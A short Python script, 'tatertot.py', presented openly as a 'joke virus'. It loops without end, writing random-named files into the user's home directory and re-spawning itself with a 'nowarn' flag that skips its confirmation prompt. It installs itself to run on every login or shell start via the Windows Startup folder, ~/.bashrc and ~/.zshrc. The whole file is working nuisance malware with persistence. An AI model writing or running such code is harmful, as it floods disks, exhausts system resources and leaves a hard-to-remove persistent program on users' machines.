"""
tatertot.py
category: joke virus
intensity - 2
"""

import os
import sys
import random #random file names

try:
    h = sys.argv[1]
    if h == "nowarn":
        original = False
    else:
        original = True
except:
    original = True
#if original == True, we ask before running

def main():
    if original:
        run = input("Are you sure you would like to run tatertot.py? (y/N)")
        if run == "y":
            pass
        else:
            sys.exit()
    while True:
        for i in range(random.randint(1,10)):
            file = open(os.path.expanduser("~") + "/" + str(random.randint(1,9999999999999999999999999999999)) + ".txt", "w")
            file.write("tatertot")
            file.close()
        os.system("python3 " + sys.argv[0] + " nowarn")
        #add to startup folder on windows, bashrc/zshrc on other systems
        if sys.platform == "win32":
            os.system("copy " + sys.argv[0] + " \"C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"")
        else:
            os.system("echo python3 " + sys.argv[0] + " nowarn >> ~/.bashrc")
            os.system("echo python3 " + sys.argv[0] + " nowarn >> ~/.zshrc")
if __name__ == "__main__":
    main()